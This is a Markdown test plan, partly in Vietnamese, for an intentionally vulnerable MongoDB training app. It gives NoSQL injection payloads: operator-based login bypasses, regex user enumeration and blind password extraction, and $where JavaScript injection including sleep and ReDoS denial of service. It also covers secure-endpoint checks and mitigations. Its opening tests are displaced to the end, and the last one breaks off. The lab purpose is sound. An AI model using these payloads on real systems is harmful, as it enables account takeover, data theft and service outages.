# 🧪 TEST SCENARIOS - KỊCH BẢN KIỂM THỬ CHI TIẾT

## 📋 MỤC LỤC
1. [Authentication Bypass Tests](#test-1-authentication-bypass)
2. [Regex Injection Tests](#test-2-regex-injection)
3. [JavaScript Injection Tests](#test-3-javascript-injection)
4. [Security Controls Tests](#test-4-security-controls)
5. [Advanced Exploitation](#test-5-advanced-exploitation)

---

## TEST 1: AUTHENTICATION BYPASS

### Test 1.1: $ne Operator Injection

**Mục tiêu:** Bypass login bằng "not equal" operator

**Steps:**
1. Mở form "Vulnerable Login"
2. Username: `{"$ne": null}`
3. Password: `{"$ne": null}`
4. Click "Login (Vulnerable)"

**Expected Result:**
- ✅ Login thành công nếu fields tồn tại

---

### Test 1.5: Combined Operators

**Payload:**
- Username: `{"$ne": "", "$exists": true}`
- Password: `{"$ne": "", "$exists": true}`

**Expected Result:**
- ✅ Bypass thành công

---

### Test 1.6: Try với Secure Endpoint

**Steps:**
1. Mở form "Secure Login"
2. Username: `{"$ne": null}`
3. Password: `{"$ne": null}`
4. Click "Login (Secure)"

**Expected Result:**
- ❌ Status: Fail
- ❌ Message: "Invalid input format"
- ✅ Attack bị block!

---

## TEST 2: REGEX INJECTION

### Test 2.1: Basic Regex - Match All

**Mục tiêu:** Dump tất cả users

**Steps:**
1. Mở form "Vulnerable Search"
2. Search term: `.*`
3. Click "Search"

**Expected Result:**
- ✅ Trả về 5 users
- ✅ Hiển thị: admin, john_doe, jane_smith, bob_wilson, alice_brown

**Data Leaked:**
```json
[
  {"username": "admin", "email": "admin@company.com", "role": "admin"},
  {"username": "john_doe", "email": "john@company.com", "role": "user"},
  ...
]
```

---

### Test 2.2: Prefix Match

**Payload:** `^a`

**Expected Result:**
- ✅ Trả về: admin, alice_brown
- ✅ (Users bắt đầu bằng 'a')

---

### Test 2.3: Blind Enumeration - Username Discovery

**Scenario:** Attacker không biết username nào tồn tại

**Steps:**
```
Step 1: ^a    → Found: admin, alice_brown
Step 2: ^ad   → Found: admin
Step 3: ^adm  → Found: admin
Step 4: ^admi → Found: admin
Step 5: ^admin$ → Found: admin (exact match!)
```

**Expected Result:**
- ✅ Enumerate được username "admin"

---

### Test 2.4: Character Class Regex

**Payload:** `^[a-z]`

**Expected Result:**
- ✅ Match users bắt đầu bằng lowercase letter

---

### Test 2.5: Case Insensitive Match

**Payload:** `(?i)admin`

**Expected Result:**
- ✅ Match "admin", "Admin", "ADMIN"

---

### Test 2.6: Complex Regex Pattern

**Payload:** `^[ajb].*`

**Expected Result:**
- ✅ Users bắt đầu bằng a, j, hoặc b
- ✅ Trả về: admin, john_doe, jane_smith, bob_wilson, alice_brown

---

### Test 2.7: Denial of Service với ReDoS

**⚠️ WARNING:** Test này có thể làm server hang!

**Payload:** `(a+)+b`

**Input:** `aaaaaaaaaaaaaaaaaaaaaaaaaaaa`

**Expected Result:**
- ⚠️ Server chậm/hang (ReDoS attack)
- ⚠️ High CPU usage

**Explanation:**
- Catastrophic backtracking
- Exponential time complexity
- DoS attack vector

---

## TEST 3: JAVASCRIPT INJECTION

### Test 3.1: Basic Boolean Bypass

**Mục tiêu:** Luôn trả về true

**Steps:**
1. Mở form "Check Username ($where)"
2. Username: `' || '1'=='1`
3. Click "Check Availability"

**Expected Result:**
- ✅ Message: "Username đã tồn tại" (luôn đúng)

**Query Execution:**
```javascript
$where: "this.username == '' || '1'=='1'"
// Điều kiện luôn TRUE
```

---

### Test 3.2: Comment Out Technique

**Payload:** `'; return true; //`

**Query becomes:**
```javascript
$where: "this.username == ''; return true; //'"
// Phần sau // bị comment
```

**Expected Result:**
- ✅ Luôn trả về true

---

### Test 3.3: Sleep Attack (DoS)

**⚠️ WARNING:** Server sẽ bị treo!

**Payload:** `'; sleep(5000); return true; //`

**Expected Result:**
- ⚠️ Server không response trong 5 giây
- ⚠️ Potential DoS attack

**Use Case:**
- Test timeout handling
- DoS vulnerability

---

### Test 3.4: Try to Access Other Collections

**Payload:** `'; var x = db.users.find().toArray(); return x.length > 0; //`

**Expected Result:**
- Depends on MongoDB configuration
- Might leak data count

---

### Test 3.5: Information Gathering

**Payload:** `'; return Object.keys(this); //`

**Expected Result:**
- Potentially reveals document structure

---

### Test 3.6: Multiple Statements

**Payload:** `'; var a = 1; var b = 2; return a + b == 3; //`

**Expected Result:**
- ✅ Execute multiple JavaScript statements

---

## TEST 4: SECURITY CONTROLS

### Test 4.1: Input Type Validation

**Test Secure Endpoint:**

**Test Case 1: Object Input**
```json
Username: {"$ne": null}
Password: {"$ne": null}
```

**Expected Result:**
- ❌ Blocked
- Message: "Invalid input format"

---

**Test Case 2: Array Input**
```json
Username: ["admin"]
Password: ["password"]
```

**Expected Result:**
- ❌ Blocked
- Message: "Invalid input format"

---

### Test 4.2: Character Validation

**Test with dangerous characters:**

**Payload 1:** `admin$test`
**Expected Result:** ❌ Blocked ("Invalid characters")

**Payload 2:** `admin{test`
**Expected Result:** ❌ Blocked

**Payload 3:** `admin}test`
**Expected Result:** ❌ Blocked

**Payload 4:** `admin_test`
**Expected Result:** ✅ Allowed (underscore OK)

---

### Test 4.3: Length Validation

**Test Case:** Username với 200 characters

**Expected Result:**
- Depends on implementation
- Should have max length limit

---

### Test 4.4: $eq Operator Protection

**Verify secure query:**

```javascript
// Input: {"$ne": null}
// Should be treated as literal string, not operator

db.users.findOne({
  username: { $eq: '{"$ne": null}' }
})
// → No match (looking for literal string)
```

**Expected Result:**
- ❌ No user found
- ✅ Attack failed

---

## TEST 5: ADVANCED EXPLOITATION

### Test 5.1: Timing Attack - Username Enumeration

**Concept:** Different response times reveal info

**Test:**
```
Request 1: username=admin (exists)
Response time: 150ms

Request 2: username=notexist (doesn't exist)
Response time: 50ms

→ Timing difference reveals existence!
```

**Mitigation:**
- Constant-time operations
- Same response for valid/invalid

---

### Test 5.2: Boolean Blind Injection

**Scenario:** No direct output, only true/false

**Technique:** Extract data character by character

**Example - Extract first character of admin password:**

```javascript
// Test if first char is 'A'
username: admin
password: {"$regex": "^A"}

// Test if first char is 'B'
password: {"$regex": "^B"}

// Continue until match...
```

**Expected Result:**
- Can enumerate password character by character

---

### Test 5.3: Error-Based Injection

**Payload:** `{"$where": "invalid javascript code"}`

**Expected Result:**
- Error message reveals:
  - MongoDB version
  - Query structure
  - Stack trace

**Information Disclosure!**

---

### Test 5.4: Combined Attack Chain

**Step 1:** Use regex to enumerate users
```
Search: .*
Result: admin, john_doe, jane_smith, bob_wilson, alice_brown
```

**Step 2:** Bypass login với $ne
```
Username: {"$ne": null}
Password: {"$ne": null}
```

**Step 3:** Access admin account
```
Result: Admin data with sensitive info
```

**Step 4:** Use JS injection to gather more info
```
Check username: '; return db.users.count(); //
```

---

### Test 5.5: Privilege Escalation Test

**Scenario:** Login as normal user, try to access admin data

**Method:** Modify role field in injection

**Payload:**
```json
{
  "username": "john_doe",
  "password": {"$ne": null},
  "$set": {"role": "admin"}
}
```

**Expected Result:**
- Depends on query structure
- Might escalate privileges

---

## 📊 TEST MATRIX

| Test ID | Attack Type | Vulnerable Endpoint | Success Rate | Severity |
|---------|-------------|-------------------|--------------|----------|
| 1.1 | $ne Bypass | /api/login | 100% | 🔴 Critical |
| 1.2 | $gt Bypass | /api/login | 100% | 🔴 Critical |
| 1.6 | $ne on Secure | /api/secure-login | 0% | ✅ Blocked |
| 2.1 | Regex Dump | /api/search | 100% | 🔴 Critical |
| 2.3 | Blind Enum | /api/search | 100% | 🟠 High |
| 2.7 | ReDoS | /api/search | 100% | 🟠 High |
| 3.1 | Boolean Bypass | /api/check-username | 100% | 🔴 Critical |
| 3.3 | Sleep DoS | /api/check-username | 100% | 🔴 Critical |

---

## 🎯 TESTING CHECKLIST

### Pre-Test
- [ ] MongoDB running
- [ ] Server started
- [ ] Browser DevTools open
- [ ] MongoDB Compass connected

### During Test
- [ ] Monitor server console
- [ ] Check browser console
- [ ] Watch MongoDB Compass (refresh to see queries)
- [ ] Note response times

### Post-Test
- [ ] Check access logs: `db.access_logs.find()`
- [ ] Verify data integrity
- [ ] Review security implications
- [ ] Document findings

---

## 🔬 MONGODB COMPASS VERIFICATION

### View Query Results:

**Step 1:** Open MongoDB Compass

**Step 2:** Connect to localhost:27017

**Step 3:** Navigate to vulnerable_app → users

**Step 4:** Click "Documents" tab

**Step 5:** Try queries in filter bar:

```javascript
// Test 1: $ne injection
{"username": {"$ne": null}, "password": {"$ne": null}}

// Test 2: Regex injection
{"username": {"$regex": "^a"}}

// Test 3: View all
{}
```

### Monitor Queries:

**In MongoDB Shell:**
```javascript
// Enable profiling
use vulnerable_app
db.setProfilingLevel(2)

// View queries
db.system.profile.find().sort({ts: -1}).limit(10).pretty()
```

---

## 📈 EXPECTED LEARNING OUTCOMES

After completing all tests:

✅ **Understand:**
- How NoSQL Injection works
- Different attack vectors
- Impact of vulnerabilities

✅ **Can identify:**
- Vulnerable code patterns
- Insecure configurations
- Attack indicators

✅ **Can implement:**
- Input validation
- Secure queries
- Defense mechanisms

✅ **Can explain:**
- Attack techniques to others
- Security implications
- Prevention methods

---

## 🎓 BONUS: WRITE YOUR OWN TEST

### Template:

```markdown
### Test X.X: [Your Test Name]

**Mục tiêu:** [What are you testing?]

**Steps:**
1. [Step 1]
2. [Step 2]
3. [Step 3]

**Payload:** `[Your payload here]`

**Expected Result:**
- [What should happen?]

**Technical Explanation:**
```
[Explain why it works]
```

**Severity:** [Critical/High/Medium/Low]
```

---

## 🔧 DEBUGGING TIPS

### Payload không work?

**Check 1:** Format JSON đúng chưa?
```javascript
// ✅ Correct
{"$ne": null}

// ❌ Wrong
{$ne: null}     // Missing quotes
{'$ne': null}   // Single quotes in JSON
```

**Check 2:** Server logs
```bash
# Watch server console for query details
[VULNERABLE] Login attempt:
Username: {"$ne":null}
```

**Check 3:** Browser DevTools
```
Network tab → Request payload
Console tab → JavaScript errors
```

**Check 4:** Test với MongoDB Compass
```javascript
// Run query directly in Compass
db.users.findOne({"username": {"$ne": null}})
```

---

## 📝 DOCUMENTATION TEMPLATE

### For Your Report:

```markdown
## Test Results

### Test: [Test Name]

**Attack Vector:** [NoSQL Injection/Regex/JS Injection]

**Payload Used:**
```
[Payload here]
```

**Steps to Reproduce:**
1. [Step 1]
2. [Step 2]

**Actual Result:**
[What happened]

**Evidence:**
[Screenshot/logs]

**Impact:**
- Confidentiality: [High/Medium/Low]
- Integrity: [High/Medium/Low]
- Availability: [High/Medium/Low]

**Recommendation:**
[How to fix]
```

---

## 🚀 NEXT STEPS

After mastering these tests:

1. **Try variations** of payloads
2. **Combine** multiple techniques
3. **Research** other NoSQL databases
4. **Practice** on intentionally vulnerable apps
5. **Learn** secure coding practices
6. **Stay updated** on new vulnerabilities

---

## ⚠️ RESPONSIBLE DISCLOSURE

**Remember:**
- ✅ Test only on YOUR systems
- ✅ Get permission before testing
- ✅ Report vulnerabilities responsibly
- ❌ Never attack production systems
- ❌ Don't use for illegal purposes

---

**Happy Testing! 🧪**

*Remember: The goal is to LEARN security, not break things!* Status: Success
- ✅ Message: "Login thành công!"
- ✅ User data hiển thị (admin user)
- ✅ Sensitive data leak: salary, SSN

**Technical Explanation:**
```javascript
// Query thực tế
db.users.findOne({
  username: {$ne: null},
  password: {$ne: null}
})
// → Trả về document đầu tiên (admin)
```

**Console Output (Server):**
```
[VULNERABLE] Login attempt:
Username: {"$ne":null}
Password: {"$ne":null}
Query result: User found
```

---

### Test 1.2: $gt Operator Injection

**Mục tiêu:** Bypass bằng "greater than" operator

**Payload:**
- Username: `{"$gt": ""}`
- Password: `{"$gt": ""}`

**Expected Result:**
- ✅ Login thành công với admin account

**Why it works:**
```javascript
// Empty string "" là nhỏ nhất
// Tất cả strings đều > ""
// → Điều kiện luôn đúng
```

---

### Test 1.3: $regex Wildcard Injection

**Payload:**
- Username: `{"$regex": ".*"}`
- Password: `{"$regex": ".*"}`

**Expected Result:**
- ✅ Match với user đầu tiên

---

### Test 1.4: $exists Operator

**Payload:**
- Username: `{"$exists": true}`
- Password: `{"$exists": true}`

**Expected Result:**
- ✅